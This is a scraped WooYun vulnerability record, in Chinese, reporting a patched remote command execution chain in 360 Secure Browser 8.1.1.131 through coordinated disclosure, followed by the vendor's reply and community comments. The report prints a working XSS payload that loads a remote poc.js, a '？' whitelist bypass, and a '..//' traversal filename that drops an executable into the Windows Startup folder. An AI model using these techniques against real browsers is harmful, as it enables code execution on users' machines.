{"id": 87203, "wybug_id": "wooyun-2016-0178241", "wybug_title": "360安全浏览器远程命令执行漏洞接力赛第四棒", "wybug_corp": "奇虎360", "wybug_author": "唐朝实验室", "wybug_date": "2016-02-24 12:23", "wybug_open_date": "2016-05-28 16:30", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-02-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-02-28：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2016-04-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-05-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-05-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-05-28：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 这只是对『心伤的胖子』接力的回应。仍旧是技术分享，其他的留给评论。浏览器版本：8.1.1.131 详细说明：  是的，这是对之前漏洞的 http://**.**.**.**/bugs/wooyun-2010-0170984 绕过，之前漏洞有两个关键点：1. 利用 ／ 符号绕过了 360 白名单的限制；2. 利用 ../ 跳转把恶意文件放置到当前用户的启动目录；360 在随后的版本中做了修复，所以在最新的 **.**.**.** 版本中漏洞肯定是不存在的。经过测试，发现 360 修复的方案为：1. 不允许域名中出现 ／ 符号，但是还是会允许别的特殊符号；2. 通过 ../ 无法跳转目录放置恶意程序到指定目录；具体怎么绕过？下面就是见证奇迹的时刻：和 ／ 有异曲同工的符号是 ？，所以我们的插件链接是：\n**.**.**.**？.**.**.**.**/poc.zip\n会被浏览器识别为：\n**.**.**.**/?.**.**.**.**/poc.zip\n这样我们绕过第一个条件的限制，成功让浏览器下载我们指定的插件。虽然新版本中浏览器限制通过 ../ 跳转到指定目录，但是经过测试发现却可以使用 ..// 来跳转到指定目录，是不是很神奇？所以我们 poc.zip 文件中只需要包含文件名为如下的文件即可在安装插件的同时把我们的文件放置到当前用户的启动目录\n//..//..//..//..//..//Microsoft//Windows//Start Menu//Programs//Startup//funny.exe\nbtw：这个地方的逻辑我真是没懂。这两个关键的点已经解决了，还有一些小的问题困扰着我们1. 新版本浏览器修复了任意域名下都能够调用 external api 的漏洞2. 只允许部分 **.**.**.** 的域名才能够调用 external api也就是我们必须找一个允许调用 external api 的 **.**.**.** 域下的 XSS 漏洞，其实我们有一个：\nhttp://m.cp.**.**.**.**/kaijiang/tdetail/?lotid=220051&issue=<script>alert(1);</script>\n但是 m.cp.**.**.**.** 域并没有调用 external api 的权限，但是 cp.**.**.**.** 域名却有权限，所以我们可以这样：1. 用 m.cp.**.**.**.** 域下的 XSS 执行 JS 代码，做两件事情：设置 document.domain 为：**.**.**.**，然后创建一个 iframe，加载一个同样设置 document.domain 为 **.**.**.** 的 cp.**.**.**.** 的页面；2. 然后跨域在 cp.**.**.**.** 域名下执行 JS 代码，通过上面的漏洞达到远程命令执行的效果；幸运的是我们在 cp.**.**.**.** 域名下找到一个 document.domain 设置为 **.**.**.** 的页面：\nhttp://cp.**.**.**.**/help/hemai.html\n所以我们的代码是：\nhttp://m.cp.**.**.**.**/kaijiang/tdetail/?lotid=220051&issue=<img%20src%3Da%20onerror%3D$.getScript(\"**.**.**.**/poc.js\")> poc.js 见测试代码\n   漏洞证明：  视频：http://**.**.**.**/wooyun/upload/201602/360_security_browser_rce_3.mov   修复方案：  1. 检测 ？ 符号；2. ..// 的逻辑也需要做下处理；   版权声明：转载请注明来源 唐朝实验室@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2016-02-28 16:28 厂商回复： 感谢白帽子提交的报告，我们第一时间通知业务部门修复了该问题并发布了新版本全网推送升级。 最新状态： 2016-04-19：已修复  ", "replys": "漏洞评价：\n评价\n     2016-02-24 12:23 |    \t\t紫霞仙子  \t\t\t( 普通白帽子  |\t\t\t        Rank:2302 漏洞数:307        | 没好团队，啥都干不成！！！)\t\t \n  前排支持技术分享！    \n     2016-02-24 12:23 |    \t\t荒废的腰子 \t\t\t( 普通白帽子  |\t\t\t        Rank:261 漏洞数:29        | 一言不合，就拿shell...)\t\t \n  前排~    \n     2016-02-24 12:25 |    \t\t田老板 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:13        | 学校杀手)\t\t \n  前排支持技术分享！    \n     2016-02-24 12:28 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  开门，洞主    \n     2016-02-24 12:28 |    \t\t诚殷的小白帽 \t\t\t( 实习白帽子  |\t\t\t        Rank:72 漏洞数:35        )\t\t \n  我靠   技术员不给力啊    \n     2016-02-24 12:34 |    \t\tAgony \t\t\t( 路人 |\t\t\t        Rank:22 漏洞数:11        | you know a cat has nine lives.)\t\t \n  前排~    \n     2016-02-24 12:35 |    \t\t猪猪侠  \t\t\t( 核心白帽子 |\t\t\t        Rank:5112 漏洞数:394        | 你都有那么多超级棒棒糖了，还要自由干吗？)\t\t \n  较真起来容易吓到人    \n     2016-02-24 12:38 |    \t\tanswer  \t\t\t( 普通白帽子  |\t\t\t        Rank:453 漏洞数:54        | 答案)\t\t \n  360哭晕在厕所    \n     2016-02-24 13:08 |    \t\tfuckadmin \t\t\t( 普通白帽子  |\t\t\t        Rank:662 漏洞数:92        | 千里之堤溃于蚁穴)\t\t \n  所谓的“安全浏览器”。    \n     2016-02-24 13:36 |    \t\t坏男孩-A_A \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:23        | 膜拜学习中)\t\t \n  所谓的“安全浏览器”。    \n     2016-02-24 13:38 |    \t\tMixes \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:20        | :))\t\t \n  感谢乌云继续较真帮助360修复更多漏洞 :)    \n     2016-02-24 13:48 |    \t\tj14n \t\t\t( 普通白帽子  |\t\t\t        Rank:1824 漏洞数:321        | ... . -.-.   - . .- --)\t\t \n  马克一下。。    \n     2016-02-24 14:05 |    \t\t欧冠狂魔阿森纳 \t\t\t( 实习白帽子  |\t\t\t        Rank:73 漏洞数:30        | 静静的看你们装逼)\t\t \n  有没有第五棒    \n     2016-02-24 14:05 |    \t\t佳佳佳佳佳  \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:7        | I want to be ur sunshine.)\t\t \n  前排支持技术分享！    \n     2016-02-24 15:13 |    \t\t姬野 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:4        | 铁甲依然在)\t\t \n  DDOS大战，又准备开始了    \n     2016-02-24 15:24 |    \t\t围观群众 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 新人学习)\t\t \n  前排留名。    \n     2016-02-24 15:48 |    \t\tdepycode \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:52        | 关注网络安全，提高技术！)\t\t \n  围观一波    \n     2016-02-24 15:55 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:359 漏洞数:70        | 慢慢挖洞)\t\t \n  360敢说自己是做安全的吗    \n     2016-02-24 16:01 |    \t\tGabriel \t\t\t( 普通白帽子  |\t\t\t        Rank:142 漏洞数:37        )\t\t \n  又一波互掐？    \n     2016-02-24 16:01 |    \t\t举起手来 \t\t\t( 核心白帽子 |\t\t\t        Rank:1900 漏洞数:197        | 准备好，举起手来！)\t\t \n  看连续剧    \n     2016-02-24 16:09 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  哦？    \n     2016-02-24 16:20 |    \t\tllkoio \t\t\t( 实习白帽子  |\t\t\t        Rank:46 漏洞数:14        | 听佛陀的教诲)\t\t \n  旷日持久！    \n     2016-02-24 16:34 |    \t\tCan \t\t\t( 普通白帽子  |\t\t\t        Rank:116 漏洞数:36        | 我是水一样的男子，因为党说我是流动人口。)\t\t \n   关注 厉害了！    \n     2016-02-24 16:53 |    \t\t秦风 \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        | 血染江山的画  怎敌妳眉间一点朱砂  覆...)\t\t \n  mark    \n     2016-02-24 16:57 |    \t\t库日天 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:8        | 图样图森破！！！)\t\t \n  牛逼啊    \n     2016-02-24 17:01 |    \t\t我是壮丁  \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:3        | 专业打酱油)\t\t \n  会不会有第五棒？    \n     2016-02-24 17:14 |    \t\t玄道 \t\t\t( 普通白帽子  |\t\t\t        Rank:140 漏洞数:41        | 就是注入 就是注入 注入)\t\t \n  牛逼 屌 围观  出售花生瓜子矿泉水 360与乌云大战    \n     2016-02-24 17:20 |    \t\t木易 \t\t\t( 普通白帽子  |\t\t\t        Rank:329 漏洞数:67        | 不，，不要误会，我不是针对谁，我是说在座...)\t\t \n  冤冤相报何时了    \n     2016-02-24 17:44 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:388 漏洞数:31        | 因为心伤，所以胖子。)\t\t \n  赞啊楼上的几位都歪楼了，多从技术角度出发啊，还冤冤相报……    \n     2016-02-24 18:03 |    \t\tSH0X8001 \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:6        | 你猜)\t\t \n  关注    \n     2016-02-24 19:13 |    \t\tMark0smith \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:68        | 我要是再正常一点就好了)\t\t \n  后排    \n     2016-02-24 21:33 |    \t\thkcs \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:9        | 只是路过)\t\t \n  支持技术分享！     \n     2016-02-24 22:19 |    \t\t白骨夫人 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:53        | 白骨夫人，白只做白的，骨就是骨气，夫人就...)\t\t \n  hate 360     \n     2016-02-25 10:04 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  连续剧真好看    \n     2016-03-01 20:19 |    \t\t白骨夫人 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:53        | 白骨夫人，白只做白的，骨就是骨气，夫人就...)\t\t \n  MB用他的浏览器，今天被XSS了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}